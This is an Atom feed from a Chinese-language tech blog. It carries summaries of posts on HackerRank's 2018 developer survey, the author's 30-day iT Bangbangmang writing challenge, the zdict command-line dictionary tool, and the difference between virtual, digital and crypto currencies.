<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Just for noting</title><link href="https://blog.m157q.tw/" rel="alternate"></link><link href="https://blog.m157q.tw/feeds/translation.zh.atom.xml" rel="self"></link><id>https://blog.m157q.tw/</id><updated>2018-02-01T00:38:24+08:00</updated><entry><title>2018 Developer Skills Report by HackerRank 摘要</title><link href="https://blog.m157q.tw/posts/2018/01/31/2018-developer-skills-report-by-hackerrank-brief/" rel="alternate"></link><published>2018-01-31T12:56:16+08:00</published><updated>2018-01-31T12:56:16+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-31:posts/2018/01/31/2018-developer-skills-report-by-hackerrank-brief/</id><summary type="html">&lt;p&gt;HackerRank 這份訪問了多個國家總計 39,441 名開發者的統計報告挺有趣的，受訪期間為 2017/10/16~2017/11/01，用 SurveyMonkey 做的調查。  &lt;/p&gt;
&lt;p&gt;原網址在此：&lt;a href="https://research.hackerrank.com/developer-skills/2018/"&gt;https://research.hackerrank.com/developer-skills/2018/&lt;/a&gt;，有更詳細的資訊，有興趣的人可以點進去自己看，以下做個摘要：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;75% 在 21 歲前就開始寫程式，有 50% 集中在 16~20 歲。  &lt;/li&gt;
&lt;li&gt;70 年代出生的有 40% 在 11~15 歲就開始寫程式，之後出生的卻又愈來愈晚才開始寫程式，愈來愈像 60 年代出生的狀況。  &lt;/li&gt;
&lt;li&gt;70% 以上都是透過自學或學校課程學寫程式  &lt;/li&gt;
&lt;li&gt;自學途徑第一名是 StackOverflow，高達 80% 以上。第二、三名則是 Youtube 和書籍，較年輕的透過 Youtube 自學者較多，較年長者則透過書籍學習較多。  &lt;/li&gt;
&lt;li&gt;總計各行業雇主尋找的前五名語言：JavaScript, Java, Python, C++, C。但根據各行業有所不同：  &lt;ul&gt;
&lt;li&gt;運輸：JavaScript, Java, Python, C++, C#  &lt;/li&gt;
&lt;li&gt;硬體：C, C++, Python, Java, JavaScript  &lt;/li&gt;
&lt;li&gt;金融：Java, JavaScript, Python, C#, C++  &lt;/li&gt;
&lt;li&gt;政府：Java, JavaScript, C#, Python, C  &lt;/li&gt;
&lt;li&gt;醫療：JavaScript, Java, Python, C#, C++  &lt;/li&gt;
&lt;li&gt;遊戲：JavaScript, Python, Java, PHP, C++  &lt;/li&gt;
&lt;li&gt;電商：Java, JavaScript, Python, C#, PHP  &lt;/li&gt;
&lt;li&gt;資安：Java, Python, JavaScript, C++, C  &lt;/li&gt;
&lt;li&gt;科技：Java, JavaScript, Python, C++, C  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;公司最需要的框架前三名：AngularJS, Node.js, React  &lt;/li&gt;
&lt;li&gt;公司最重視的應徵者能力前三名：解決問題的能力、程式語言熟悉度、除錯的能力。  &lt;/li&gt;
&lt;li&gt;公司重視的履歷項目前三名：工作經驗、簡歷（例如：GitHub）、學歷  &lt;ul&gt;
&lt;li&gt;愈大的公司愈重視經驗、較小的公司則參考簡歷的比例較多，但還是以經驗為主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;執行階層的面試官重視的履歷項目前三名：簡歷（例如：GitHub）、工作經驗、年資  &lt;ul&gt;
&lt;li&gt;推測因為到了執行階層的面試官都已經是最後一關了，技術能力上沒啥問題，比較重視應徵者額外還做過哪些事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;受訪者之後最想學的程式語言前三名：Golang, Python, Scala  &lt;/li&gt;
&lt;li&gt;受訪者最喜歡的語言前五名：Python, C, C++, Java, JavaScript。根據年齡層稍有不同，但 Python 以壓倒性獲得絕大多數支持：  &lt;ul&gt;
&lt;li&gt;18~24 歲：Python, C++, C, Java, JavaScript  &lt;/li&gt;
&lt;li&gt;25~34 歲：Python, C, Golang, JavaScript, TypeScript  &lt;/li&gt;
&lt;li&gt;35~44 歲：Python, C, Golang, TypeScript, C#  &lt;/li&gt;
&lt;li&gt;45~54 歲：Python, Golang, C, TypeScript, C++  &lt;/li&gt;
&lt;li&gt;55 歲以上：Swift, C, Python, Java, C++  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;受訪者最喜歡的框架前五名：Node.js, React, ExpressJS, AngularJS, Django  &lt;/li&gt;
&lt;li&gt;對公司來說面試最大的挑戰前三名：沒有 onsite 之前很難鑑定應徵者的能力、面試時間太過費時、應徵者不夠多。  &lt;/li&gt;
&lt;li&gt;公司常用的鑑定應徵者能力的工具前五名：履歷篩選、問題解決與邏輯測驗、內部推薦、遠端線上測驗、人格測驗  &lt;/li&gt;
&lt;li&gt;受訪者重視的工作特性前三名：合理的工時與生活品質（Good work-life balance)、專業技能成長與學習、薪資。根據各國家有所不同。  &lt;ul&gt;
&lt;li&gt;對於學生來說，專業技能成長最重要。  &lt;/li&gt;
&lt;li&gt;對於已就業者來說，生活品質則稍比專業技能成長重要。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;公司如何改善員工生活品質前三名：彈性工時、遠端工作、責任制（只計產出而不是工時）  &lt;/li&gt;
&lt;li&gt;67% 受訪者使用 Vim, 14% 使用 Emacs。  &lt;/li&gt;
&lt;li&gt;Founder, CTO, CEO 中有 15% 在 11 歲前就開始學寫程式，其他職位則是只有 5%。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://research.hackerrank.com/developer-skills/2018/"&gt;2018 Developer Skills Report by HackerRank&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Programmer"></category><category term="Interview"></category><category term="Coding"></category></entry><entry><title>2018 iT 邦幫忙鐵人賽參賽心得</title><link href="https://blog.m157q.tw/posts/2018/01/19/2018-ithelp-ironman/" rel="alternate"></link><published>2018-01-22T14:55:49+08:00</published><updated>2018-01-22T14:55:49+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-19:posts/2018/01/19/2018-ithelp-ironman/</id><summary type="html">&lt;h2&gt;2018 iT 邦幫忙鐵人賽參賽心得&lt;/h2&gt;
&lt;p&gt;&lt;img alt="完賽通知" src="/files/2018-ithelp-ironman/finish-notification.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;之前就有看過一些朋友參賽，這次是自己第一次參賽，主要是因為剛好近期離職了，而且想要一併把自己在工作期間暫時紀錄下來的一些草稿都清掉，否則等到下一份工作的話這些草稿應該就會變萬年草稿了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;2017/12/18 報名，但一直到最後一天 2017/12/20 才下定決心參賽，到昨天 2018/01/18 成功達成連續 30 天每天發文的成就。我認真覺得要不是現在在待業，根本沒辦法完賽，真的很佩服那些有在工作還能完賽的參賽者，甚至也有之前參賽的人跟我說過「我當時參賽是事前就寫好 30 篇文章了」。&lt;br /&gt;
&lt;img alt="鐵人獎牌" src="/files/2018-ithelp-ironman/medal.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;我覺得開頭倒沒有那麼難，可能是因為我有好幾篇草稿可以寫的關係，對我來說最困難的反而是快要完賽的前一週，一來是因為我囤積的草稿已經清完，參賽的目的達成了，二來是因為中間有幾天的文章其實還沒補完，直到完賽前 5 天，我其實還有 10 篇文章未完成。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;快完賽的前幾天一度想放棄，當時才深刻體會到什麼叫作「行百里者半九十」。一直拖到最後兩天，還剩下 7 篇文章沒完成。在最後才狠下心來，2018/01/17 晚上沒睡覺，一直撐到 2018/01/18 最後一天的晚上十一點多，總算把 7 篇文章都補完。&lt;br /&gt;
&lt;img alt="行百里者半九十" src="/files/2018-ithelp-ironman/last-day-notification.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;最後順利在 2018/01/19 的午夜十二點多拿到了本次鐵人賽個人挑戰組的獎牌，要躺上床去睡覺時，才意識到自己已經保持清醒狀態 37.5 小時了，腎上腺素的威力真的有點驚人，硬是讓我在最後一天補了 5 篇文章，而且思緒異常清晰還不太容易飢餓。&lt;br /&gt;
&lt;img alt="KanbanFlow 時數" src="/files/2018-ithelp-ironman/kanbanflow.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;就像本次參賽時寫下的，即便平常就有在寫落格文章的習慣，要連續發 30 天的文章真的是件很有挑戰性的事，從總完賽率 &lt;code&gt;143/359 == 0.3983286908077994&lt;/code&gt; 不到四成可見一般。（不知道是不是還在審查中，如果是的話，確認完賽的人數可能還會再降低。）&lt;br /&gt;
&lt;img alt="參賽敘述" src="/files/2018-ithelp-ironman/intro.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;撇除掉複製貼上別人的文章（這次真的有人這樣做被發現），如果是撰寫入門系列的文章可能難度會比較低一些，畢竟都是自己所熟知的東西了。非入門系列的話，我覺得如果沒有 15~20 篇以上的草稿或者至少 10 篇以上早就準備好的文章的話，真的是很難完賽，如果是神人等級的當然另當別論，像這次我看到最強的應該就是&lt;a href="https://ithelp.ithome.com.tw/users/20107159/ironman/1325"&gt;爬蟲始終來自於墮性&lt;/a&gt;這個系列了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;也有看到有人參加了好幾次都中途棄賽的，只能說連續 30 天發文看似簡單，但實際去做了以後才發現真的沒那麼簡單。接下來幾個禮拜應該都不太想寫文章了，應該會專心看還沒看完的書、刷題寫程式還有更新履歷準備之後面試的事。不知道之後還會不會參賽，也許會，也許不會，未來的事誰都說不準啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;最後附上這次參賽的系列網址：&lt;a href="https://ithelp.ithome.com.tw/users/20107813/ironman/1535"&gt;https://ithelp.ithome.com.tw/users/20107813/ironman/1535&lt;/a&gt;，有興趣的人可以去看。  &lt;/p&gt;
&lt;p&gt;也可以在我的部落格找 &lt;a href="/tag/2018-it-bang-bang-mang-tie-ren-sai/"&gt;"2018 iT 邦幫忙鐵人賽" 這個 tag 的文章&lt;/a&gt;，有任何意見或問題都歡迎回覆。  &lt;/p&gt;
&lt;p&gt;以下也直接按照參賽發文時間順序列出這 30 篇文章的標題與在我落格上的連結：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/20/4g-mobile-network-tw/"&gt;關於 4G 行動網路的一些筆記&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/21/how-to-answer-questions-in-a-helpful-way-zh-tw/"&gt;《回答的智慧》&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/22/write-a-python-script-to-retrieve-twitter-direct-messsages/"&gt;用 Python 寫個程式抓出我在 Twitter 上存了哪些 tweet&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/23/differences-between-encryption-compression-and-encoding/"&gt;如何區分加密、壓縮、編碼&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/24/i-love-open-source-because-someone-will-write-testings-for-me/"&gt;我愛開源，因為會遇到路人幫我寫測試。&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/25/differences-between-encryption-and-hashing/"&gt;加密和雜湊有什麼不一樣？&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/26/i-left-my-first-full-time-job/"&gt;我的新鮮人離職紀錄&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/27/fetch-my-github-commits-in-one-organization-with-python-script/"&gt;用 Python 抓出我在前公司貢獻了多少 GitHub commits&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/28/about-django-f-expression-q-object-and-aggregation/"&gt;關於 Django 的 F() expressions, Q object, Aggregation 的一些筆記&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/29/ngrok-https-proxy-to-write-chatbot-in-localhost/"&gt;利用 ngrok 直接在本機開發 chatbot&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/30/git-cross-repo-cherry-pick/"&gt;使用 Git 時如何做出跨 repo 的 cherry-pick&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2017/12/31/mount-iphone-on-linux/"&gt;Linux 上如何拿到 iPhone 裡的資料&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/01/change-keymap-on-linux/"&gt;Linux 上如何透過指令更改鍵盤鍵位&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/02/tips-about-facebook-url/"&gt;Facebook 網址的一些黑魔法&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/03/try-to-do-gofmt-in-python/"&gt;嘗試在 Python 中做到 Golang fmt 的效果&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/04/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/"&gt;解決 Arch Linux 上 gcin 2.8.5-2 無法在 Qt 5.9.x 以後的應用程式中執行的問題&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/05/set-default-application-in-desktop-environment-on-linux/"&gt;Linux 設定桌面環境預設開啟程式&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/06/use-cookie-with-urllib-in-python/"&gt;Python 中讓 urllib 使用 cookie 的方法&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/07/django-rest-framework-note/"&gt;關於 Django REST framework 的一些筆記&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/08/miracast-on-linux/"&gt;如何在 Linux 上使用 Miracast&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/09/tools-i-use/"&gt;我平常在電腦上用了哪些程式&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/10/docker-travis-ci-kubernetes-gke/"&gt;Docker + Travis CI + Kubernetes + GKE&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/11/dealing-with-china-network/"&gt;中國網路相關筆記&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/12/articles-related-to-interview/"&gt;整理一些跟面試相關的文章&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/13/zyxel-wah7706/"&gt;ZyXEL WAH7706 問題紀錄&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/14/soft-skiils-the-software-developers-life-manual/"&gt;《軟技能：代碼之外的生存指南》&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/15/the-pragmatic-programmer-from-journeyman-to-master/"&gt;《程序员修炼之道:从小工到专家》&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/16/change-docker-storage-driver-from-devicemapper-to-overlay2-to-free-your-disk-space-on-arch-linux/"&gt;在 Arch Linux 上將 Docker 的 Storage Driver 從 devicemapper 改為 overlay2 以釋放硬碟空間&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/17/virtual-currency-vs-digital-currency-vs-cryptocurrency/"&gt;虛擬貨幣 vs 數位貨幣 vs 加密貨幣&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2018/01/18/zdict-intro/"&gt;zdict 介紹&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="iThome"></category><category term="iThelp"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>zdict 介紹</title><link href="https://blog.m157q.tw/posts/2018/01/18/zdict-intro/" rel="alternate"></link><published>2018-02-01T00:38:24+08:00</published><updated>2018-02-01T00:38:24+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-18:posts/2018/01/18/zdict-intro/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/zdict/zdict"&gt;GitHub - zdict/zdict: The last online dictionary framework you need. (?)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;在&lt;a href="https://blog.m157q.tw/posts/2018/01/09/tools-i-use/"&gt;我平常在電腦上用了哪些程式 | Just for noting&lt;/a&gt;這篇，有提到會為 &lt;code&gt;zdict&lt;/code&gt; 這套我和幾個朋友一起開發的線上字典查詢指令做個詳細一點的介紹，也算是幫 &lt;code&gt;zdict&lt;/code&gt; 加個繁體中文的文章吧。  &lt;/p&gt;
&lt;p&gt;因為 repo 上面都是用英文，幾個禮拜前遇到有台灣人想幫忙貢獻，對自己的英文不夠有自信，結果最後寄了 email 用中文問我，想說讓這個工具的文件多一點繁體中文的親切感（？  &lt;/p&gt;
&lt;p&gt;有空會再寫一篇文章講這位貢獻者來信詢問的問題以及我回覆的內容，主要是跟 GitHub 新手如何參與開源專案有關，想說第一次有人因為 &lt;code&gt;zdict&lt;/code&gt; 寄信給我，機會難得，順便用這個機會拿 &lt;code&gt;zdict&lt;/code&gt; 來當活教材。有徵得對方同意了，但文章一直還沒寫 XD。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;簡介&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/zdict/zdict"&gt;https://github.com/zdict/zdict&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;有以下幾個特性：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python 3 撰寫  &lt;ul&gt;
&lt;li&gt;2020 年就要拋棄 Python 2 啦，因為是 side project，所以懶得支援 Python 2 了，請大家直接用 Python 3 吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;主要用途就是用來查線上字典  &lt;ul&gt;
&lt;li&gt;要連網才能使用  &lt;/li&gt;
&lt;li&gt;沒有離線模式  &lt;ul&gt;
&lt;li&gt;不使用字典檔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;預設會使用資料庫中的快取（可選擇關閉）  &lt;ul&gt;
&lt;li&gt;每次的查詢預設都會先檢查有沒有存在使用者的電腦上的 zdict 資料庫，有的話就會直接拿來用。  &lt;/li&gt;
&lt;li&gt;所以如果是查詢自己查過的單字的話，是可以在不用連網的情況下使用的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;字典預設是使用 Yahoo! 奇摩字典的英翻中或中翻英查詢  &lt;ul&gt;
&lt;li&gt;有其他線上字典可供選擇：  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;moe&lt;/code&gt;: 萌典  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;moe-taiwanese&lt;/code&gt;: 萌典台語  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;spanish&lt;/code&gt;: 西班牙語  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;jisho&lt;/code&gt;: 日語  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yahoo&lt;/code&gt;: 中英查詢  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;urban&lt;/code&gt;: Urban Dictionary，用來查英文流行用語，看美劇滿常用的。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yandex&lt;/code&gt;: 俄語  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;預設會有語法上色（可選擇關閉）  &lt;/li&gt;
&lt;li&gt;原生支援 macOS, Linux, FreeBSD。可透過 Docker 在 Windows 上執行。  &lt;/li&gt;
&lt;li&gt;有一般模式也有互動模式  &lt;ul&gt;
&lt;li&gt;互動模式很適合開啟來掛著，遇到有要查單字的時候就可以直接查，不需要再額外打 &lt;code&gt;zdict xxx&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;緣起&lt;/h2&gt;
&lt;p&gt;這個 side project 大概是從 2015 年 4 月開始的，一開始只是因為那陣子很常看美劇，所以有查單字的需求，覺得要開網頁動滑鼠很麻煩，所以就找有沒有可以在終端機裏面直接查字典的服務。  &lt;/p&gt;
&lt;p&gt;當時是找到 &lt;a href="https://github.com/chenpc/ydict"&gt;GitHub - chenpc/ydict&lt;/a&gt;，使用一陣子之後遇到 Yahoo! 字典網頁改版，所以有東西壞掉，發了個 PR 回去，結果作者很久沒處理，看起來在忙其他事了。  &lt;/p&gt;
&lt;p&gt;原本想說自己的 fork 改一改能用就好，但和 iblis 那天可能嗑了太多 Python，不知道發什麼神經覺得乾脆來弄一個可以整合查詢多個線上字典的框架好了。  &lt;/p&gt;
&lt;p&gt;因為 ydict 基本上就是個 Python 2 的 script 而已，當時就想說要弄一個 Pure Python 3 然後還要符合基本開源專案架構的 side project，所以 zdict 就這樣誕生了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;使用說明&lt;/h2&gt;
&lt;p&gt;這個就直接看 &lt;a href="https://github.com/zdict/zdict/blob/master/README.rst"&gt;zdict/README.rst&lt;/a&gt; 吧，裡頭的英文敘述沒有很難，就算看不懂其實也可以直接看截圖和 example 使用應該沒啥問題，我就不在這贅述了。這篇文章會比較像是開發心得的紀錄，留個念想（？）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;雜談&lt;/h2&gt;
&lt;p&gt;其實我還蠻享受這個和幾個朋友單純因為需求而開的 side project，從開始弄這個專案以來基本上沒啥壓力，然後想試一些跟 Python 有關的新東西都可以在這個 side project 嘗試，因為有了基本的開源專案的框架，要測一些東西也很方便，不需要自己再重頭刻一些有的沒的。  &lt;/p&gt;
&lt;p&gt;例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;透過 Travis CI 自動發佈新版本到 PyPI  &lt;/li&gt;
&lt;li&gt;透過 Docker Cloud 綁定 GitHub 的權限，在有新的 tag 的時候自動 build image，放到 Docker Hub，完成 Docker Image 的 CI。  &lt;ul&gt;
&lt;li&gt;這部份的功能原本是用 Docker Hub 做，但用到一半發現 Docker Hub 在這部份很難用，又剛好看到 Docker Cloud，試了一下發現做的比較好，所以就改用 Docker Cloud 了。  &lt;/li&gt;
&lt;li&gt;唯一一個被雷到的部份是，如果原先使用 Docker Hub，改用 Docker Cloud 的話，得把原本的 Docker Hub Repo 砍掉，用 Docker Cloud 來建一個新的 Automated build 的 Repo，這部份可能會多花一點時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 Docker Image  &lt;/li&gt;
&lt;li&gt;pytest, coverage 相關的參數設定  &lt;/li&gt;
&lt;li&gt;使用 Pipfile  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上這些都是我初次經驗就拿這個專案來試，我覺得滿開心的。雖然快 3 年過去了，好像仍舊沒有成為當初說的框架，要新增新的字典進來我覺得也還不夠簡單，但就順其自然吧。  &lt;/p&gt;
&lt;p&gt;然後大家也是有啥需求就自己開 issue，然後自己開發。大多數都是「自己的 issue 自己解的狀況」：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有人因為想在 Vim 裏面用，所以直接寫了個 Vim plugin: &lt;a href="https://github.com/zdict/zdict.vim"&gt;GitHub - zdict/zdict.vim: A vim plugin integrate with zdict - the last online dictionary framework you need.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;有人因為懶得打指令想要補完，所以弄了個 completion script: &lt;a href="https://github.com/zdict/zdict.sh"&gt;GitHub - zdict/zdict.sh: A collection of shell completion scripts for zdict&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;有人因為想用滑鼠選起來就能直接查，所以寫了這個：&lt;a href="https://github.com/zdict/zdict.qt"&gt;GitHub - zdict/zdict.qt: zdict with Qt5 widget&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;反正就是很自由啦，連 organizaiton 都是拿 One Taiwan 的圖片產生器來改的：&lt;a href="https://github.com/zdict"&gt;zdict · GitHub&lt;/a&gt;，就知道有多北七。XD  &lt;/p&gt;
&lt;p&gt;我覺得大家應該都要至少要找到一個屬於自己的這種 side project，可以讓你跟一些人 cowork，但又不會有壓力，同時又符合你日常生活的需求。  &lt;/p&gt;
&lt;p&gt;而且因為彼此想要的功能不一樣，而且又是開放原始碼的專案，所以可以學到自己不會的東西。唯一的小缺憾大概就是，這只是個小確幸的專案，不是什麼大專案，但又何妨？  &lt;/p&gt;
&lt;p&gt;要練習寫程式的話真的從自身的需求出發就夠了，不需要做一個什麼多偉大多困難的專案，可以等夠熟練的時候再說，希望大家都能找到一個屬於自己的 side project 當作核爆場（誒  &lt;/p&gt;</summary><category term="zdict"></category><category term="online dictionary"></category><category term="cli"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>虛擬貨幣 vs 數位貨幣 vs 加密貨幣</title><link href="https://blog.m157q.tw/posts/2018/01/17/virtual-currency-vs-digital-currency-vs-cryptocurrency/" rel="alternate"></link><published>2018-01-17T05:30:34+08:00</published><updated>2018-01-17T05:30:34+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-17:posts/2018/01/17/virtual-currency-vs-digital-currency-vs-cryptocurrency/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;兩派說法  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虛擬貨幣 == 數位貨幣 &amp;gt; 加密貨幣  &lt;/li&gt;
&lt;li&gt;虛擬貨幣 &amp;gt; 數位貨幣 &amp;gt; 加密貨幣  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;因為看到&lt;a href="https://twitter.com/tzangms/status/953252211957485571"&gt;推特上有人問&lt;/a&gt;，&lt;br /&gt;
自己其實也有被這問題困擾著，於是就花了點時間查了一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;查了一些文章以後發現大致上分為兩派：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「虛擬貨幣 == 數位貨幣 &amp;gt; 加密貨幣」派  &lt;ul&gt;
&lt;li&gt;目前以這派說法好像比較常見，英文維基百科上的描述偏向這類說法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「虛擬貨幣 &amp;gt; 數位貨幣 &amp;gt; 加密貨幣」派  &lt;ul&gt;
&lt;li&gt;中文維基百科偏向這類說法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;我自己歸納如下，我個人是比較傾向「虛擬貨幣 &amp;gt; 數位貨幣 &amp;gt; 加密貨幣」派  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虛擬貨幣 == 非實體貨幣  &lt;/li&gt;
&lt;li&gt;數位貨幣 == 可用於購買現實物品的虛擬貨幣  &lt;/li&gt;
&lt;li&gt;加密貨幣 == 基於密碼學原理的數位貨幣  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%95%B8%E4%BD%8D%E8%B2%A8%E5%B9%A3"&gt;數位貨幣 - 維基百科，自由的百科全書&lt;/a&gt;有列出非加密貨幣的數位貨幣，例如: e-gold, Digital Monetary Trust, Ripple, Ven。  &lt;/p&gt;
&lt;p&gt;我自己覺得是有點像 Artifical Intelligence vs Machine Learning vs Deep Learning 的關係啦。&lt;br /&gt;
雖然一般人可能覺得能溝通就好，但我覺得身為一個處在這個專業領域的人士，應該要有自己的堅持。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-is-the-difference-between-a-cryptocurrency-a-digital-currency-and-a-virtual-currency"&gt;What is the difference between a cryptocurrency, a digital currency, and a virtual currency?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Virtual_currency"&gt;Virtual currency - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Digital_currency"&gt;Digital currency - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Cryptocurrency"&gt;Cryptocurrency - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E8%99%9A%E6%8B%9F%E8%B4%A7%E5%B8%81"&gt;虛擬貨幣 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%95%B8%E4%BD%8D%E8%B2%A8%E5%B9%A3"&gt;數位貨幣 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
